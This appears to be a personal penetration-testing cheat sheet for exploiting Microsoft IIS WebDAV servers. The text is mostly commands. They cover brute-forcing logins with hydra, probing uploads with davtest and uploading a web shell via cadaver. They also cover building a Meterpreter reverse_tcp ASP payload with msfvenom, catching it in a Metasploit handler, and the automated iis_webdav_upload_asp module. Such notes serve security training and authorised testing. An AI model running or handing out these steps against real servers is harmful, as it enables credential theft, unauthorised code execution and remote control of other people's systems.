# Exploiting Microsoft IIS Webdav

Legitimate credentials are needed for interacting with WebDav

Step 1: Identify if it has been configurated on the server. This can be completed with Nmap  
Step 2: Brute Force attack on the server to identify credentials we can use  
Step 3: Authenticate and upload malicious .asp payload  

## **Tools**  
Davtest - Scan, authenticate, and exploit WEbdav server  
Cadaver - supports download, upload, onscreen display, in place editing, etc

**Brute Force username and password**  
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt (IP address or domain) http-get /webdav/

## Davtest  
Checking what file types we can upload  
**Unauthenticated** - ```davtest -url http://(IP address)/webdav```  
**Authenticated** - ```davtest -url -auth bob:password123321 http://(IP address)/webdav```  

## Cadaver  
This will access the contents of the directory (download/upload)  
```cadaver http://(IPaddress)/webdav```  
Enter credentials  

**Uploading Webshell**  
Web shells located -- /usr/share/webshells  
```put /usr/share/webshells/(file type)/webshell.(filetype)```  

# Metasploit  
**Manual**  
Generating an asp payload  
```msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Local IP address) LPORT=1234 -f asp > shell.asp```  
Upload shell using cadaver (previous 2 steps)   
Start postgresql services - ```services postgresql start && msfconsole```  
Use multi/handler  - ```set payload/windows/meterpreter/reverse_tcp```  

**Automated**  
Module - exploit/windows/iis/iis_webdav_upload_asp  
set path - /webdav  ```set path /webdav/metasploit.asp```  

